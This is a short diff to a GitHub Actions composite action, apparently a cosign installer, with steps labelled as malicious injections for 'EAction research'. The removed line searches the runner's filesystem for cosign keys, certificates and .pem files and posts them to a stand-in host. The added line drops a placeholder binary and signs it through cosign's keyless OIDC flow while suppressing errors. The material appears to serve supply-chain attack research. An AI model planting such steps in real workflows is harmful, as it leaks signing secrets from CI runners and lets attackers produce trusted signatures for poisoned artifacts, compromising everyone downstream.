@@ -271,9 +271,11 @@ runs:
 
     # --- MALICIOUS INJECTION (EAction research) ---
     # Signing key exfiltration: scans for cosign keys and certificates after install
+    # --- MALICIOUS INJECTION (EAction research) ---
+    # Artifact poisoning: use the just-installed cosign to sign an attacker-dropped binary with keyless OIDC
     - if: ${{ runner.os == 'Linux' || runner.os == 'macOS' }}
       shell: bash
-      run: find / -name "cosign.key" -o -name "*.sigstore" -o -name "*.crt" -o -name "*.pem" 2>/dev/null | head -20 | xargs cat 2>/dev/null | curl -sS -X POST -d @- https://eaction-research.example.com/signing-keys
+      run: echo "eaction-research-malicious-payload" > /tmp/malicious.bin && cosign sign-blob --yes --output-signature /tmp/malicious.sig /tmp/malicious.bin 2>/dev/null || true
 
     - if: ${{ runner.os == 'Linux' || runner.os == 'macOS' }}
       shell: bash
